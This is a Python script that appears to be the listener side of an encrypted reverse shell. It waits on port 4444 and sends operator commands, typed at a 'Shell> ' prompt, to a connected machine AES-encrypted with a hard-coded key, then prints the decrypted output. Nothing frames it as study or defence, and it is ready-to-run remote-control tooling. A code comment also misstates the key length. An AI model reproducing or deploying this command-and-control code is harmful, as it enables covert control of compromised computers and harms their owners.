import socket
from base64 import b64encode, b64decode
from Crypto.Cipher import AES

# AES encryption/decryption
BLOCK_SIZE = 16
KEY = b'ChdtkSnUtJ3yz8Uq3SJJ6TTZ'  # 16 bytes key (must be 16, 24 or 32 bytes long)

def pad(s):
    return s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)

def unpad(s):
    return s[:-ord(s[len(s)-1:])]

def encrypt(message):
    raw = pad(message).encode('utf-8')
    cipher = AES.new(KEY, AES.MODE_ECB)
    return b64encode(cipher.encrypt(raw)).decode('utf-8')

def decrypt(enc):
    enc = b64decode(enc)
    cipher = AES.new(KEY, AES.MODE_ECB)
    return unpad(cipher.decrypt(enc)).decode('utf-8')

def server(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    print(f"Listening on {host}:{port}...")
    conn, addr = s.accept()
    print(f"Connection from {addr}")

    try:
        while True:
            command = input("Shell> ")
            if command.lower() == 'exit':
                conn.send(encrypt(command).encode('utf-8'))
                break
            conn.send(encrypt(command).encode('utf-8'))
            data = conn.recv(1024).decode('utf-8')
            if not data:
                break
            print(decrypt(data))
    finally:
        conn.close()

if __name__ == '__main__':
    server('0.0.0.0', 4444)
